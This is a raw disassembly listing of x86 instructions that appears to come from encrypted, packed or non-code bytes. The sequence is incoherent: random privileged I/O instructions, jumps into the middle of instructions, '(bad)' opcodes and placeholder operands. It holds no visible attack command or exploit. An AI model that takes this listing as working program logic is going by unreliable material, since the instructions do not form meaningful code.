  403ec0:	sar    BYTE PTR [esi-0x12],cl
  403ec3:	xor    DWORD PTR ds:0xf1033878,ecx
  403ec9:	push   ds
  403eca:	dec    edx
  403ecb:	mov    ds:0xb9556cca,eax
  403ed0:	xor    BYTE PTR ds:0xc079c92e,cl
  403ed6:	mov    dh,0xb5
  403ed8:	xchg   ebx,eax
  403ed9:	pusha  
  403eda:	jno    0x403eda
  403edc:	mov    ebx,0xde02f609
  403ee1:	pusha  
  403ee2:	inc    edx
  403ee3:	out    dx,al
  403ee4:	push   ds
  403ee5:	lea    ecx,[ebx+0x1f2e210e]
  403eeb:	inc    ecx
  403eec:	std    
  403eed:	rol    DWORD PTR [esi-0x38],0x1e
  403ef1:	loop   0x403ea5
  403ef3:	outs   dx,BYTE PTR ds:[esi]
  403ef4:	call   0xda3e:0x36a0c411
  403efb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403efc:	retf   
  403efd:	mov    edx,DWORD PTR [edx+0x67]
  403f00:	pop    esi
  403f01:	js     0x403f16
  403f03:	mov    ecx,0x19cf5301
  403f08:	push   cs
  403f09:	das    
  403f0a:	lea    edx,[ecx]
  403f0c:	and    BYTE PTR [ecx+0x1],ah
  403f0f:	push   ss
  403f10:	fndisi(8087 only) 
  403f12:	arpl   WORD PTR [esi-0x6f117b2f],sp
  403f18:	jo     0x403f12
  403f1a:	out    0xbb,eax
  403f1c:	stc    
  403f1d:	jmp    0x5fb6e019
  403f22:	mov    esi,0x58b9ff08
  403f27:	loopne 0x403f87
  403f29:	jle    0x403f98
  403f2b:	jmp    0x403f9b
  403f2d:	pop    esp
  403f2e:	mov    bh,0xb4
  403f30:	int3   
  403f31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f32:	enter  0x83a0,0x75
  403f36:	adc    BYTE PTR [ebx-0x3c5fea5e],bl
  403f3c:	pop    esi
  403f3d:	mov    al,0xb8
  403f3f:	and    BYTE PTR [edx],bh
  403f41:	sub    esp,ebx
  403f43:	pop    esi
  403f44:	imul   esp,DWORD PTR [eax-0x3d],0xffffffe9
  403f48:	xchg   ecx,eax
  403f49:	jne    0x403f37
  403f4b:	push   edi
  403f4c:	adc    al,0x13
  403f4e:	out    dx,al
  403f4f:	test   DWORD PTR [esi-0x15e2e709],ebp
  403f55:	dec    eax
  403f56:	mov    eax,gs:0x47aa1506
  403f5c:	daa    
  403f5d:	cs lock jbe 0x403fbf
  403f61:	pop    DWORD PTR [eax+0x68d9b8c7]
  403f67:	cmc    
  403f68:	or     al,0x15
  403f6a:	dec    edi
  403f6b:	xor    eax,0x5b1f755f
  403f70:	push   es
  403f71:	lea    edx,[esi-0x73]
  403f74:	dec    edx
  403f75:	sahf   
  403f76:	out    dx,al
  403f77:	scas   al,BYTE PTR es:[edi]
  403f78:	hlt    
  403f79:	aas    
  403f7a:	and    eax,0xbeb590fc
  403f7f:	pushf  
  403f80:	sbb    cl,BYTE PTR [edi]
  403f82:	pop    eax
  403f83:	shr    DWORD PTR [ecx+ecx*4-0x7b3e5008],0xeb
  403f8b:	lods   al,BYTE PTR ds:[esi]
  403f8c:	mov    esp,0x4f132d3e
  403f91:	loopne 0x403fcc
  403f93:	push   edx
  403f94:	pop    es
  403f95:	ja     0x403ff9
  403f97:	dec    esp
  403f98:	ret    
  403f99:	mov    dl,0x7e
  403f9b:	mov    eax,ds:0xad0936f2
  403fa0:	jnp    0x404013
  403fa2:	cld    
  403fa3:	cdq    
  403fa4:	arpl   WORD PTR [edi],ax
  403fa6:	in     al,dx
  403fa7:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  403fa9:	and    BYTE PTR [edi],bh
  403fab:	or     eax,DWORD PTR [edi+0x20]
  403fae:	sub    BYTE PTR [esi+0x21a72978],cl
  403fb4:	test   bl,0xf6
  403fb7:	mov    ecx,0x19f28d60
  403fbc:	pop    esi
  403fbd:	dec    ebp
  403fbe:	aas    
  403fbf:	div    BYTE PTR [esi+0x6d]
  403fc2:	add    edi,ebx
  403fc4:	xchg   edi,eax
  403fc5:	pop    ecx
  403fc6:	fadd   DWORD PTR [eax-0x23]
  403fc9:	bound  ebp,QWORD PTR [ecx+edx*4]
  403fcc:	jp     0x403fca
  403fce:	sti    
  403fcf:	sbb    ebx,DWORD PTR [esi-0x1]
  403fd2:	ror    BYTE PTR [eax+0x3e],cl
  403fd5:	push   0x61542f16
  403fda:	(bad)  
  403fdb:	adc    BYTE PTR [eax],dh
  403fdd:	xor    al,0xa9
  403fdf:	stc    
  403fe0:	enter  0xeb07,0x8b
  403fe4:	leave  
  403fe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fe6:	mov    esi,ebp
  403fe8:	mov    eax,0x339b55d8
  403fed:	popa   
  403fee:	stos   DWORD PTR es:[edi],eax
  403fef:	std    
  403ff0:	xchg   ecx,eax
  403ff1:	pop    ds
  403ff2:	bound  edx,QWORD PTR [ebx+0x6a1089aa]
  403ff8:	ja     0x403fb8
  403ffa:	out    dx,al
  403ffb:	or     DWORD PTR [eax],eax
  403ffd:	sbb    ah,BYTE PTR [eax-0x1ca00e76]
  404003:	je     0x403ffd
  404005:	pop    ebx
  404006:	dec    esi
  404007:	int3   
  404008:	js     0x403fea
  40400a:	(bad)  
  40400b:	arpl   WORD PTR [ecx-0x79f674ed],bp
  404011:	pusha  
  404012:	jns    0x404093
  404014:	pop    ebx
  404015:	outs   dx,DWORD PTR ds:[esi]
  404016:	arpl   WORD PTR ds:0xa6eee2bc,bp
  40401c:	adc    DWORD PTR [edi-0x40acafde],edx
  404022:	cmp    DWORD PTR [esi+0xf8dd1a1],ecx
  404028:	adc    BYTE PTR [eax],ah
  40402a:	cmp    ebp,DWORD PTR [eax+0x65726d87]
  404030:	pop    edx
  404031:	aam    0xee
  404033:	leave  
  404034:	stos   BYTE PTR es:[edi],al
  404035:	jno    0x404083
  404037:	jecxz  0x40400b
  404039:	popf   
  40403a:	scas   eax,DWORD PTR es:[edi]
  40403b:	mov    al,ds:0x6efb453e
  404040:	mov    bh,0x66
  404042:	mov    esp,0xb6aa5f9a
  404047:	mov    esp,0x30b9b215
  40404c:	fdivr  QWORD PTR [ecx+0x60d9f795]
  404052:	in     eax,0x8c
  404054:	inc    ebp
  404055:	sbb    eax,0x1dc24719
  40405a:	out    dx,al
  40405b:	rcr    BYTE PTR [ebx+0x404335a4],1
  404061:	neg    DWORD PTR [ebx]
  404063:	mov    eax,ds:0x3a7ff9d8
  404068:	jno    0x404005
  40406a:	xchg   ecx,eax
  40406b:	dec    edx
  40406c:	pop    esi
  40406d:	rol    DWORD PTR [edx],cl
  40406f:	add    BYTE PTR [eax-0x3d510ab8],0x60
  404076:	mov    cl,0xc9
  404078:	sub    al,BYTE PTR [edi+ebx*8]
  40407b:	or     eax,0x1de73a6f
  404080:	jecxz  0x40403e
  404082:	dec    ebp
  404083:	in     eax,dx
  404084:	pop    ds
  404085:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404086:	xor    eax,0x110ef621
  40408b:	test   al,0x32
  40408d:	shl    DWORD PTR [ebp-0x65],cl
  404090:	jo     0x4040b2
  404092:	stc    
  404093:	inc    ebp
  404094:	mov    eax,ds:0xd57cee2b
  404099:	cmp    bl,bl
  40409b:	mov    es,WORD PTR [eax]
  40409d:	xchg   edx,eax
  40409e:	arpl   WORD PTR [ebp-0x19dd2c70],sp
  4040a4:	sub    DWORD PTR [ecx-0x52d13672],esp
  4040aa:	out    dx,al
  4040ab:	xlat   BYTE PTR ds:[ebx]
  4040ac:	popf   
  4040ad:	mov    al,ds:0x66361813
  4040b2:	cmp    esp,DWORD PTR [edx-0x67a31045]
  4040b8:	aas    
  4040b9:	mov    ah,0x3a
  4040bb:	pop    ecx
  4040bc:	ds shr dh,cl
  4040bf:	inc    ebp
  4040c0:	aam    0xe8
  4040c2:	push   ebx
  4040c3:	mov    dh,0x8e
  4040c5:	dec    eax
  4040c6:	inc    eax
  4040c7:	jmp    0x40408b
  4040c9:	cdq    
  4040ca:	inc    eax
  4040cb:	inc    ebp
  4040cc:	mov    eax,ds:0x682267e0
  4040d1:	inc    ebx
  4040d2:	out    dx,al
  4040d3:	mov    ds:0xb7a2fea7,eax
  4040d8:	adc    BYTE PTR [eax+0xbbfa0da],cl
  4040de:	jo     0x40409c
  4040e0:	add    bl,BYTE PTR [edx+0x315e82bd]
  4040e6:	adc    eax,0xff5dc38c
  4040eb:	push   ebx
  4040ec:	inc    ebx
  4040ed:	popa   
  4040ee:	or     BYTE PTR [edi+edi*8-0x7f],bl
  4040f2:	jo     0x404171
  4040f4:	xor    ebx,DWORD PTR [edi+0x23]
  4040f7:	call   0xf5c2a2cb
  4040fc:	icebp  
  4040fd:	sub    dh,0x12
  404100:	xchg   ecx,eax
  404101:	in     eax,0x1c
  404103:	and    bl,ah
  404105:	push   ebx
  404106:	fcmovb st,st(4)
  404108:	cmc    
  404109:	enter  0xa103,0x40
  40410d:	ss sar esi,0x9e
  404111:	push   cs
  404112:	out    dx,al
  404113:	push   esi
  404114:	enter  0x9dba,0x81
  404118:	ds mov esp,0xe3aa0c4
  40411e:	stc    
  40411f:	sub    edx,esp
  404121:	adc    al,0xd
  404123:	popf   
  404124:	pop    esi
  404125:	push   ds
  404126:	xchg   BYTE PTR [edx-0x11cb93db],ah
  40412c:	mov    cl,0x5d
  40412e:	je     0x40418f
  404130:	sbb    BYTE PTR [eax+0x4d8ee2df],bh
  404136:	mov    ebp,DWORD PTR [edi+0x26]
  404139:	xor    dh,0xa0
  40413c:	test   eax,0x5907e49c
  404141:	dec    eax
  404142:	cmc    
  404143:	mov    al,ds:0x66691a39
  404148:	mov    al,ds:0x5e349d24
  40414d:	bound  edi,QWORD PTR [ebp-0x4b3c99ad]
  404153:	call   0x19eea22e
  404158:	inc    esp
  404159:	call   0x75ee:0x4cbced29
  404160:	jmp    0x404142
  404162:	cmc    
  404163:	xchg   edx,eax
  404164:	test   eax,0x12a17d70
  404169:	jo     0x404121
  40416b:	mov    ecx,0x72048e28
  404170:	pop    edi
  404171:	sbb    ebp,DWORD PTR [ecx+0x8]
  404174:	loopne 0x404122
  404176:	in     eax,dx
  404177:	pop    eax
  404178:	xlat   BYTE PTR ds:[ebx]
  404179:	dec    eax
  40417a:	(bad)  [eax-0x5741aefc]
  404180:	jns    0xfcaeddee
  404186:	out    dx,al
  404187:	mov    ds:0xb6661d79,eax
  40418c:	xchg   BYTE PTR [ecx+0x15],cl
  40418f:	test   al,0x50
  404191:	stos   DWORD PTR es:[edi],eax
  404192:	aad    0x8f
  404194:	push   0x10
  404196:	dec    esi
  404197:	add    DWORD PTR [ebx],0x50
  40419a:	out    dx,al
  40419b:	mov    ds:0x56c4e92d,eax
  4041a0:	pop    ebx
  4041a1:	in     al,0x3a
  4041a3:	ins    DWORD PTR es:[edi],dx
  4041a4:	je     0x4041ff
  4041a6:	add    eax,0xceadae47
  4041ab:	mov    al,0x1a
  4041ad:	pop    esi
  4041ae:	cli    
  4041af:	and    DWORD PTR [edi+0x56],ebx
  4041b2:	daa    
  4041b3:	mov    ebx,0x3922e076
  4041b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041b9:	adc    bl,BYTE PTR [edi-0x5f]
  4041bc:	mov    esp,0x829ddafe
  4041c1:	jle    0x40422c
  4041c3:	cmp    al,0xea
  4041c5:	jno    0x4041b5
  4041c7:	test   BYTE PTR [edi-0x31a0e2a8],dl
  4041cd:	cmp    bl,BYTE PTR [eax]
  4041cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041d0:	xchg   BYTE PTR [esi],cl
  4041d2:	repz aad 0x30
  4041d5:	call   0xe1b5:0x260fd13f
  4041dc:	pop    edi
  4041dd:	or     esp,DWORD PTR [edx]
  4041df:	fbld   TBYTE PTR [eax+0x2e205556]
  4041e5:	ss push eax
  4041e7:	dec    eax
  4041e8:	dec    ebx
  4041e9:	popa   
  4041ea:	add    al,dl
  4041ec:	inc    esi
  4041ed:	std    
  4041ee:	and    DWORD PTR [esi+0x52ee1e70],ebx
  4041f4:	pop    ebx
  4041f5:	aas    
  4041f6:	test   eax,0x3eecb678
  4041fb:	mov    eax,ds:0x326ab72a
  404200:	outs   dx,BYTE PTR ds:[esi]
  404201:	aas    
  404202:	xchg   edx,eax
  404203:	jp     0x404263
  404205:	sub    dl,BYTE PTR [ebx-0x215e443a]
  40420b:	mov    ebp,DWORD PTR [edx+0x11ae7f44]
  404211:	loope  0x4041e4
  404213:	outs   dx,BYTE PTR ds:[esi]
  404214:	pop    es
  404215:	sub    al,0x28
  404217:	adc    ebx,DWORD PTR [ebx-0x18]
  40421a:	cmp    ebp,ebx
  40421c:	repnz dec edx
  40421e:	(bad)  
  40421f:	shl    ebx,cl
  404221:	push   esi
  404222:	and    esp,DWORD PTR [ecx-0x207786f6]
  404228:	xchg   ebp,esp
  40422a:	xor    BYTE PTR [edi],bl
  40422c:	pop    esi
  40422d:	ins    DWORD PTR es:[edi],dx
  40422e:	pushf  
  40422f:	shl    BYTE PTR [ecx],cl
  404231:	add    bh,dh
  404233:	fadd   st,st(4)
  404235:	mov    ds:0xde6a8e52,al
  40423a:	mov    al,0x60
  40423c:	mov    al,ds:0x8b1364a9
  404241:	sbb    eax,0xd240e2ed
  404246:	jg     0x40429a
  404248:	shl    al,cl
  40424a:	ss xchg edi,eax
  40424c:	cli    
  40424d:	pusha  
  40424e:	jb     0x4042bf
  404250:	adc    DWORD PTR [ecx],ebp
  404252:	cmp    al,0xfa
  404254:	pop    ebx
  404255:	fsub   st(6),st
  404257:	adc    eax,0xc585ca76
  40425c:	xchg   BYTE PTR [eax],dh
  40425e:	hlt    
  40425f:	mov    al,ds:0xcf8b7353
  404264:	mov    DWORD PTR [edi+0x2c64de52],0xc42e9f
  40426e:	mov    ebp,0x8a7bb4c0
  404273:	mov    eax,ds:0x692d369f
  404278:	imul   esi,ebp,0x15e8c98
  40427e:	fwait
  40427f:	push   esi
  404280:	lods   eax,DWORD PTR ds:[esi]
  404281:	push   ds
  404282:	lds    edx,FWORD PTR [edx+0x44c26070]
  404288:	push   ebx
  404289:	jge    0x40423a
  40428b:	xlat   BYTE PTR ds:[ebx]
  40428c:	cmp    BYTE PTR [esi],bl
  40428e:	push   edx
  40428f:	mov    BYTE PTR [esi+0x2],bl
  404292:	sub    BYTE PTR [ecx+0x4dc5d4b0],al
  404298:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404299:	sub    DWORD PTR [edi-0x7636d341],eax
  40429f:	sub    ebx,esi
  4042a1:	xchg   esi,eax
  4042a2:	or     edi,DWORD PTR [ecx]
  4042a4:	daa    
  4042a5:	inc    ebx
  4042a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042a7:	push   esi
  4042a8:	test   BYTE PTR [edi-0x14],0xa2
  4042ac:	pop    ebp
  4042ad:	scas   al,BYTE PTR es:[edi]
  4042ae:	ja     0x404230
  4042b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042b1:	inc    eax
  4042b2:	cmp    BYTE PTR [eax-0x352d9f6c],0x52
  4042b9:	stc    
  4042ba:	sub    edi,DWORD PTR [ebp-0x72]
  4042bd:	bound  esi,QWORD PTR [edx+0x1d5ff3c2]
  4042c3:	push   esi
  4042c4:	pop    ecx
  4042c5:	inc    esp
  4042c6:	arpl   WORD PTR [edi+0x3e],si
  4042c9:	fs xor eax,0x44f5e9a1
  4042cf:	mov    ds:0x575d0af9,eax
  4042d4:	pop    esi
  4042d5:	stc    
  4042d6:	imul   BYTE PTR [ebx-0x6f63e596]
  4042dc:	xor    BYTE PTR [ecx-0x7c],ah
  4042df:	div    DWORD PTR [eax+0x75]
  4042e2:	in     eax,0x1b
  4042e4:	dec    ebp
  4042e5:	inc    edi
  4042e6:	out    dx,al
  4042e7:	das    
  4042e8:	adc    cl,BYTE PTR [eax]
  4042ea:	pushw  ds
  4042ec:	lahf   
  4042ed:	mov    bh,0x3f
  4042ef:	mov    eax,ds:0xc8741f8d
  4042f4:	push   ss
  4042f5:	leave  
  4042f6:	stos   DWORD PTR es:[edi],eax
  4042f7:	test   al,0x4c
  4042f9:	pop    ebp
  4042fa:	rcl    BYTE PTR [ebx+0x5e],1
  4042fd:	adc    bh,BYTE PTR [esi]
  4042ff:	mul    DWORD PTR [edi]
  404301:	loop   0x40431f
  404303:	mov    eax,ds:0xb0b0c5dc
  404308:	outs   dx,DWORD PTR ds:[esi]
  404309:	mov    bh,0xa1
  40430b:	mov    edi,0x38068b51
  404310:	fbld   TBYTE PTR [ebx+edx*1-0x37]
  404314:	dec    eax
  404315:	rcr    eax,0x4
  404318:	lock pusha 
  40431a:	call   0x50e0ee0a
  40431f:	inc    ebp
  404320:	test   BYTE PTR [eax-0x12],0x26
  404324:	js     0x4042af
  404326:	mov    ds:0x941fa096,al
  40432b:	mov    eax,ds:0xfc216528
  404330:	imul   eax,DWORD PTR [eax-0x6e],0x52
  404334:	push   esp
  404335:	outs   dx,BYTE PTR ds:[esi]
  404336:	lock cli 
  404338:	push   ds
  404339:	jbe    0x404366
  40433b:	or     ecx,DWORD PTR [edi*2+0x76f2a486]
  404342:	xor    BYTE PTR [edi-0x76],dh
  404345:	aad    0x5e
  404347:	sub    eax,0xfe77ffc
  40434c:	sub    BYTE PTR [esi-0x4ba10b4e],dh
  404352:	fisttp WORD PTR [esi-0x30]
  404355:	pop    esp
  404356:	mov    dh,0x2d
  404358:	inc    eax
  404359:	loope  0x404337
  40435b:	and    BYTE PTR [eax],bl
  40435d:	push   ecx
  40435e:	pop    ss
  40435f:	fsub   DWORD PTR [edi+eax*8-0x3a]
  404363:	test   eax,ecx
  404365:	fiadd  WORD PTR [edi+0x14]
  404368:	jne    0x4043aa
  40436a:	repnz mov ebp,0xfae06157
  404370:	gs out dx,al
  404372:	push   edx
  404373:	(bad)  
  404374:	ds scas eax,DWORD PTR es:[edi]
  404376:	out    dx,al
  404377:	mov    ch,0x3d
  404379:	(bad)  
  40437a:	(bad)  
  40437b:	in     al,0xf5
  40437d:	mov    BYTE PTR [ecx-0x5e],bh
  404380:	sbb    DWORD PTR [edx],edx
  404382:	ss lahf 
  404384:	mov    esp,0xade0b842
  404389:	jnp    0x404387
  40438b:	mov    esi,0xefcf525f
  404390:	mov    dl,0xe2
  404392:	jne    0x4043c5
  404394:	pop    eax
  404395:	dec    ecx
  404396:	(bad)  
  404397:	mov    eax,ds:0xe353ec07
  40439c:	es xchg ecx,eax
  40439e:	mov    ah,0xe
  4043a0:	pop    edi
  4043a1:	stc    
  4043a2:	jo     0x40438a
  4043a4:	mov    al,ds:0xa278fb36
  4043a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043aa:	and    ah,BYTE PTR [ecx-0x478dfc98]
  4043b0:	gs and eax,0xe15e11de
  4043b6:	jp     0x4043be
  4043b8:	mov    esp,0xc06e8b6c
  4043bd:	pusha  
  4043be:	rcr    DWORD PTR [ecx],1
  4043c0:	pop    esp
  4043c1:	shr    DWORD PTR [edx],0xd3
  4043c4:	push   0x3f
  4043c6:	loope  0x4043a9
  4043c8:	pop    esi
  4043c9:	pop    eax
  4043ca:	mov    ecx,0x116b93bb
  4043cf:	jge    0x404430
  4043d1:	pop    edx
  4043d2:	pushf  
  4043d3:	pop    esi
  4043d4:	push   esp
  4043d5:	xor    BYTE PTR [eax-0x61d849b0],0x57
  4043dc:	pop    esi
  4043dd:	xor    al,0xb1
  4043df:	cli    
  4043e0:	push   edx
  4043e1:	pushf  
  4043e2:	push   eax
  4043e3:	mov    edx,0xe891606d
  4043e8:	dec    esi
  4043e9:	push   esi
  4043ea:	outs   dx,BYTE PTR ds:[esi]
  4043eb:	and    bl,cl
  4043ed:	add    ebp,esi
  4043ef:	sub    al,0x3f
  4043f1:	jecxz  0x40442a
  4043f3:	cwde   
  4043f4:	inc    edi
  4043f5:	mov    ah,0x5b
  4043f7:	mov    eax,ds:0xc202c8b8
  4043fc:	aam    0xeb
  4043fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043ff:	xchg   esi,eax
  404400:	pop    ebp
  404401:	dec    ebp
  404402:	cs stc 
  404404:	popf   
  404405:	dec    ebx
  404406:	inc    esp
  404407:	loopne 0x404437
  404409:	adc    ah,BYTE PTR [edx]
  40440b:	test   al,0xa7
  40440d:	fiadd  WORD PTR [eax+0x64]
  404410:	mov    ah,0x89
  404412:	mov    es,WORD PTR [edx+0x78ab5267]
  404418:	or     edi,DWORD PTR [edx]
  40441a:	and    DWORD PTR [ecx],esi
  40441c:	scas   eax,DWORD PTR es:[edi]
  40441d:	loopne 0x404444
  40441f:	call   esi
  404421:	add    esi,DWORD PTR [esi+0x495fcaf3]
  404427:	adc    DWORD PTR [ebx+0x227d5128],ebp
  40442d:	mov    dl,0xa3
  40442f:	dec    ebp
  404430:	mov    dh,0x44
  404432:	ins    BYTE PTR es:[edi],dx
  404433:	stc    
  404434:	aaa    
  404435:	imul   esi,ecx,0x20
  404438:	mov    ds:0x53b970f6,eax
  40443d:	nop
  40443e:	ins    DWORD PTR es:[edi],dx
  40443f:	mov    eax,ds:0xbd4724ab
  404444:	push   edx
  404445:	pop    edx
  404446:	stos   BYTE PTR es:[edi],al
  404447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404448:	pop    esi
  404449:	call   0x763:0x470f0d77
  404450:	xchg   ebp,eax
  404451:	popa   
  404452:	scas   eax,DWORD PTR es:[edi]
  404453:	xchg   ebp,eax
  404454:	ret    0xd77a
  404457:	mov    al,ds:0x85b65edb
  40445c:	and    dl,BYTE PTR [edx-0x12]
  40445f:	mov    esp,fs
  404461:	pop    ebx
  404462:	mov    BYTE PTR [edi-0x5f12f368],0x48
  404469:	gs push esp
  40446b:	shl    bh,1
  40446d:	cdq    
  40446e:	retf   
  40446f:	sbb    al,0x5e
  404471:	retf   0xcb65
  404474:	(bad)  
  404475:	mov    dl,0xde
  404477:	push   eax
  404478:	les    esp,FWORD PTR [eax-0x7b]
  40447b:	jbe    0x40443b
  40447d:	jle    0x404401
  40447f:	ret    0x3487
  404482:	in     eax,dx
  404483:	fnstenv [edi+0x7c]
  404486:	xchg   esp,eax
  404487:	sbb    dl,ah
  404489:	stc    
  40448a:	inc    esi
  40448b:	dec    edx
  40448c:	cmp    eax,DWORD PTR [ebp+0x7f]
  40448f:	ins    DWORD PTR es:[edi],dx
  404490:	int    0x60
  404492:	cdq    
  404493:	ja     0x404511
  404495:	ror    bl,0x20
  404498:	pop    ebx
  404499:	and    eax,0x6575f319
  40449e:	mov    gs,edi
  4044a0:	sbb    dh,BYTE PTR [ecx+esi*4-0x5c]
  4044a4:	aas    
  4044a5:	add    bh,dh
  4044a7:	sub    ebx,DWORD PTR [ebx-0x17]
  4044aa:	pop    es
  4044ab:	mov    eax,ds:0x8abcb295
  4044b0:	jbe    0x4044f5
  4044b2:	add    ebp,DWORD PTR [edi+0x72707805]
  4044b8:	ja     0x404465
  4044ba:	and    ah,BYTE PTR [ecx-0x2f]
  4044bd:	dec    edi
  4044be:	and    al,0x14
  4044c0:	sbb    eax,0xba6f0165
  4044c5:	outs   dx,BYTE PTR ds:[esi]
  4044c7:	mov    WORD PTR [edx-0x4a78ccf3],ds
  4044cd:	pusha  
  4044ce:	sar    BYTE PTR [ecx+eax*4],1
  4044d1:	repz or al,0xfe
  4044d4:	or     eax,0x750a23b2
  4044d9:	pusha  
  4044da:	sti    
  4044db:	and    eax,0xdf0a7f9b
  4044e0:	pop    ecx
  4044e1:	sub    DWORD PTR [eax-0x5f],ecx
  4044e4:	(bad)  
  4044e5:	and    al,0xa6
  4044e7:	rcr    BYTE PTR [edi-0x2d],0xa8
  4044eb:	dec    ebp
  4044ec:	pop    esi
  4044ed:	retf   
  4044ee:	or     al,0x24
  4044f0:	cdq    
  4044f1:	out    0xcc,eax
  4044f3:	aad    0x8e
  4044f5:	pusha  
  4044f6:	mov    bl,0x46
  4044f8:	dec    esp
  4044f9:	pop    es
  4044fa:	inc    esi
  4044fb:	imul   ecx,DWORD PTR [eax],0xffffffc4
  4044fe:	out    dx,al
  4044ff:	mov    gs,esp
  404501:	xor    edi,ebp
  404503:	inc    edx
  404504:	sbb    eax,0x7fa19f23
  404509:	or     eax,0x53d7f2d9
  40450e:	jb     0x4044d5
  404510:	pop    ebp
  404511:	sbb    al,0x1f
  404513:	mov    ebp,DWORD PTR [edi-0x75258c54]
  404519:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40451a:	scas   eax,DWORD PTR es:[edi]
  40451b:	mov    al,ds:0x3e555d73
  404520:	bnd jae 0x4044bc
  404523:	sbb    BYTE PTR [esi+0x1d],0xc3
  404527:	dec    esp
  404528:	push   es
  404529:	adc    eax,0x5ca4c45d
  40452e:	inc    esp
  40452f:	shl    DWORD PTR [edi+ebp*8],1
  404532:	push   eax
  404533:	and    dh,BYTE PTR [ecx-0x40]
  404536:	in     al,0xf0
  404538:	in     al,0x2d
  40453a:	fs jae 0x40459b
  40453d:	test   al,0x1a
  40453f:	jbe    0x40457e
  404541:	mov    ah,0x47
  404543:	or     al,0xdf
  404545:	or     bl,dh
  404547:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404548:	pop    esi
  404549:	(bad)  
  40454b:	push   ss
  40454c:	dec    edi
  40454d:	leave  
  40454e:	and    al,ah
  404550:	push   edx
  404551:	fsubr  DWORD PTR [edi]
  404553:	fcmovnu st,st(6)
  404555:	or     DWORD PTR [ecx-0x60173835],0x471dfa1
  40455f:	push   ecx
  404560:	fsubp  st(6),st
  404562:	jp     0x4045c1
  404564:	pop    esi
  404565:	jnp    0x4045a3
  404567:	push   ebp
  404568:	pop    es
  404569:	inc    esp
  40456a:	adc    eax,0xd543a3cd
  40456f:	sub    eax,DWORD PTR [ebx]
  404571:	mov    eax,ds:0xa4c49831
  404576:	js     0x404512
  404578:	pop    esi
  404579:	xor    esp,DWORD PTR fs:[edx+ebp*8+0x32b5fff4]
  404581:	popa   
  404582:	xor    cl,BYTE PTR [eax+ebx*8+0x63a80878]
  404589:	push   0xffffffee
  40458b:	icebp  
  40458c:	mov    esi,0x8a2fd6fe
  404591:	ror    BYTE PTR [ecx-0x5f],1
  404594:	cdq    
  404595:	repnz imul edi,DWORD PTR [eax],0x76d43ec6
  40459c:	aaa    
  40459d:	and    bh,dl
  40459f:	mov    al,ds:0xeb30620d
  4045a4:	aad    0x9a
  4045a6:	inc    edx
  4045a7:	mov    eax,ds:0x9888d07
  4045ac:	adc    BYTE PTR [ecx+0x13],0x70
  4045b0:	pop    esi
  4045b1:	mov    esi,?
  4045b3:	ss mov ecx,0xc771f201
  4045b9:	inc    esp
  4045ba:	dec    ebx
  4045bb:	pop    eax
  4045bc:	sbb    DWORD PTR [ecx+0x2d],edi
  4045bf:	mov    eax,ds:0x9a2b24fb
  4045c4:	mov    esp,0x5ea2e4d2
  4045c9:	add    dh,bh
  4045cb:	inc    esp
  4045cc:	call   0xdec8c03c
  4045d1:	pop    ecx
  4045d2:	cmp    bl,BYTE PTR [ebp-0x4c51bcc9]
  4045d8:	dec    ebx
  4045d9:	sbb    eax,0x273358a6
  4045de:	in     eax,dx
  4045df:	add    eax,0xf796010b
  4045e4:	sub    eax,0x400146b7
  4045e9:	mov    ch,0x46
  4045eb:	test   al,0x27
  4045ed:	pop    eax
  4045ee:	mov    al,ds:0x87f070a3
  4045f3:	outs   dx,DWORD PTR ds:[esi]
  4045f4:	aam    0x1c
  4045f6:	out    dx,al
  4045f7:	mov    bl,0xfc
  4045f9:	clc    
  4045fa:	dec    esp
  4045fb:	ficom  DWORD PTR [edx*2+0x4169a464]
  404602:	sahf   
  404603:	stc    
  404604:	(bad)  
  404605:	mov    ebx,0x14720c86
  40460a:	out    dx,al
  40460b:	bound  edx,QWORD PTR [edi+0x2ba69cbf]
  404611:	cli    
  404612:	fisubr WORD PTR [eax+ebx*1-0xfc8ff8c]
  404619:	mov    al,ds:0xaba6bd63
  40461e:	jg     0x4045bd
  404620:	pop    esi
  404621:	lods   eax,DWORD PTR ds:[esi]
  404622:	or     eax,0xc42fed4
  404627:	xchg   ecx,eax
  404628:	jl     0x40469e
  40462a:	sub    dl,BYTE PTR [ebp-0x2ab69f4c]
  404630:	and    eax,DWORD PTR [ebp-0x7a]
  404633:	fistp  WORD PTR [esi-0x31]
  404636:	in     eax,dx
  404637:	pop    edi
  404638:	push   ss
  404639:	ins    BYTE PTR es:[edi],dx
  40463a:	or     ch,bl
  40463c:	mov    esp,DWORD PTR [eax-0x15]
  40463f:	push   ss
  404640:	mov    esp,0xa8ad3227
  404645:	cmp    ch,dh
  404647:	xor    al,0xf2
  404649:	js     0x4046b5
  40464b:	or     DWORD PTR [ebp+0x4b],edi
  40464e:	je     0x404601
  404650:	hlt    
  404651:	sbb    BYTE PTR [ebx+ecx*8+0x25],dl
  404655:	or     ebp,esi
  404657:	lock jne 0x40460d
  40465a:	aas    
  40465b:	std    
  40465c:	jns    0x404682
  40465e:	pop    edi
  40465f:	mov    ds:0x137e7fd3,al
  404664:	dec    ebp
  404665:	fld    DWORD PTR [ebp-0x14e83c83]
  40466b:	pop    ebx
  40466c:	fnstenv [ebx]
  40466e:	daa    
  40466f:	mul    DWORD PTR [edi-0x32]
  404672:	sbb    al,0x19
  404674:	push   0x57
  404676:	int    0x8e
  404678:	adc    BYTE PTR [ebx+eax*2+0x61],bh
  40467c:	jno    0x404688
  40467e:	mov    ds:0xeec95a80,al
  404683:	mov    ?,WORD PTR [ecx+0x2b7d2a5f]
  404689:	jo     0x40469a
  40468b:	mov    ds:0xf92b0890,al
